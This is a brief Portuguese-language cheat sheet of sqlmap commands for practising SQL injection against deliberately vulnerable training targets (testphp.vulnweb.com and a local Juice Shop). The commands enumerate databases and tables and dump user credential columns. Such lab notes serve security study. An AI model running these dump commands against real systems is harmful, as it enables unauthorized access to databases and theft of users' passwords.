# SQLMap

Site para testes http://testphp.vulnweb.com
```
sqlmap --help
```
```
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs
```
```
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbms=mysql -D acuart --tables
```
``` 
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbms=mysql -D acuart -T users --columns
```
``` 
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbms=mysql -D acuart -T users -C name,pass,uname,email --dump
``` 
Database Schema Juice-Shop
``` 
sqlmap -u "http://localhost:3000/rest/products/search?q=q" --dbms=sqlite --level=3 --risk=3 --technique=B --threads=4 --schema
```
```
sqlmap -u "http://localhost:3000/rest/products/search?q=q" --dbms=sqlite --level=3 --risk=3 --technique=B --threads=4 --tables
```
```
sqlmap -u "http://localhost:3000/rest/products/search?q=q" --dbms=sqlite -D SQLite_masterdb -T Users --dump --threads=4
```
```
sqlmap -u "http://localhost:3000/rest/products/search?q=q" --dbms=sqlite -D SQLite_masterdb -T Users -C email,password,role --dump --threads=4
```
## Fontes:

https://github.com/sqlmapproject/sqlmap/wiki/Usage

https://github.com/sqlmapproject/sqlmap/wiki/Introduction
